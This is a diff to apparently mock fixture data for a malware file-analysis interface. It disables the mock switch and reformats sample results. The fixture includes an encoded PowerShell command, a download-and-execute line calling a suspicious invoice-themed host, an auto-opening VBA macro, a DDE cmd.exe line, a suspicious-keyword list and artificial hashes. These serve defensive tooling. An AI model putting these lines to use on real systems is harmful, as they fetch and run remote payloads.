@@ -21,7 +21,7 @@ import type { FileAnalysisJob, FileAnalysisResult } from "@/types/file-analysis"
  * The switch. Set to false to turn the fixture off without removing any code —
  * the mock job id then falls through to the normal API path like any other id.
  */
-const MOCK_ANALYSIS_ENABLED = true
+const MOCK_ANALYSIS_ENABLED = false
 
 /**
  * Guarded by DEV as well, so the fixture cannot serve data from a production
@@ -109,8 +109,7 @@ export function mockResult(): FileAnalysisResult {
 					"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...",
 					'IEX (New-Object Net.WebClient).DownloadString("http://cdn.delivery-invoice.top/gate.php")'
 				],
-				macros:
-					'Attribute VB_Name = "NewMacros"\nSub AutoOpen()\n  Call Stage2\nEnd Sub\n\nPrivate Sub Stage2()\n  CreateObject("WScript.Shell").Run Decode(payload), 0, False\nEnd Sub',
+				macros: 'Attribute VB_Name = "NewMacros"\nSub AutoOpen()\n  Call Stage2\nEnd Sub\n\nPrivate Sub Stage2()\n  CreateObject("WScript.Shell").Run Decode(payload), 0, False\nEnd Sub',
 				autoexec_keywords: ["AutoOpen", "Document_Open", "Workbook_Open"],
 				suspicious_keywords: ["Shell", "CreateObject", "WScript.Shell", "DownloadString", "powershell"],
 				dde: "DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe",
@@ -252,19 +251,55 @@ export function mockResult(): FileAnalysisResult {
 				}
 			],
 			processes: [
-				{ name: "WINWORD.EXE", pid: 3120, ppid: 812, command_line: '"C:\\Program Files\\Office\\WINWORD.EXE" /n invoice_statement_2026.docm' },
-				{ name: "cmd.exe", pid: 4408, ppid: 3120, command_line: "cmd /c powershell -w hidden -enc SQBFAFgA..." },
-				{ name: "powershell.exe", pid: 5012, ppid: 4408, command_line: "powershell -w hidden -enc SQBFAFgA..." },
-				{ name: "svchost32.exe", pid: 5644, ppid: 5012, command_line: "%APPDATA%\\Microsoft\\Windows\\svchost32.exe" },
+				{
+					name: "WINWORD.EXE",
+					pid: 3120,
+					ppid: 812,
+					command_line: '"C:\\Program Files\\Office\\WINWORD.EXE" /n invoice_statement_2026.docm'
+				},
+				{
+					name: "cmd.exe",
+					pid: 4408,
+					ppid: 3120,
+					command_line: "cmd /c powershell -w hidden -enc SQBFAFgA..."
+				},
+				{
+					name: "powershell.exe",
+					pid: 5012,
+					ppid: 4408,
+					command_line: "powershell -w hidden -enc SQBFAFgA..."
+				},
+				{
+					name: "svchost32.exe",
+					pid: 5644,
+					ppid: 5012,
+					command_line: "%APPDATA%\\Microsoft\\Windows\\svchost32.exe"
+				},
 				{ name: "rundll32.exe", pid: 6120, ppid: 5644, command_line: "rundll32.exe shell32.dll,Control_RunDLL" }
 			],
 			payloads: [
-				{ name: "stage2.bin", sha256: "1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d", type: "PE32 executable" },
-				{ name: "config.json", sha256: "2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e", type: "extracted config" }
+				{
+					name: "stage2.bin",
+					sha256: "1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d",
+					type: "PE32 executable"
+				},
+				{
+					name: "config.json",
+					sha256: "2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e",
+					type: "extracted config"
+				}
 			],
 			dropped: [
-				{ name: "svchost32.exe", sha256: "3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f", type: "PE32 executable" },
-				{ name: "tmp8f1a.tmp", sha256: "4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a", type: "data" },
+				{
+					name: "svchost32.exe",
+					sha256: "3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f",
+					type: "PE32 executable"
+				},
+				{
+					name: "tmp8f1a.tmp",
+					sha256: "4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a",
+					type: "data"
+				},
 				{ name: "settings.dat", sha256: "5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b" }
 			],
 			screenshots: [],
